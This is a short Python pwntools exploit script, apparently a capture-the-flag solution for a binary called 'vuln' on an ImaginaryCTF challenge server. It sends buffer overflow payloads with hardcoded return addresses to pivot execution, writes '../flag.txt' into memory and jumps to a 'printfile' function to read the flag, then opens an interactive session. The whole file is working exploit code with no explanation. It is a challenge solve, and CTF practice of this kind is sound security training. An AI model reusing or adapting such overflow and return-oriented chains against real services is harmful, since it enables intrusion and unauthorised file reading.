#!/usr/bin/env python3


from pwn import *


e = ELF("./vuln")
#r = process("./vuln")
r = remote("ropity.chal.imaginaryctf.org",1337)
exploit = b"A" * 16 + p64(0x40119b) + p64(0x404108) + p64(0x401142)
r.sendline(exploit)
sleep(0.4)
exploit = b"A" * 8 + p64(0x4040c0) + p64(0x401142)
r.sendline(exploit)
sleep(0.4)
r.sendline(b"../flag.txt\x00\x00\x00\x00\x00" + p64(0) * 3 + p64(e.sym.printfile))
r.interactive()
